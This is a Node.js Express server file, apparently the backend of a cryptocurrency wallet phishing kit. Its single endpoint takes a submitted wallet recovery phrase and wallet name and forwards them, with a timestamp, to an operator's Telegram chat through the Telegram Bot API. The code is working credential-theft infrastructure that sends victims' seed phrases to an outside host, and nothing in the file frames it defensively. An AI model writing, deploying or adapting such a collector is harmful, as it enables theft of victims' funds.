import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import axios from 'axios';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Route to receive recovery phrase and send to Telegram
app.post('/api/send-recovery-phrase', async (req, res) => {
  try {
    const { phrase, walletName } = req.body;

    if (!phrase || !walletName) {
      return res.status(400).json({ error: 'Missing phrase or walletName' });
    }

    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(500).json({ error: 'Telegram credentials not configured' });
    }

    const message = `
🔐 *Recovery Phrase Received*

*Wallet:* ${walletName}
*Phrase:* 
\`\`\`
${phrase}
\`\`\`

*Timestamp:* ${new Date().toISOString()}
    `;

    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    
    const response = await axios.post(url, {
      chat_id: telegramChatId,
      text: message,
      parse_mode: 'Markdown'
    });

    res.json({ success: true, data: response.data });
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    res.status(500).json({ error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
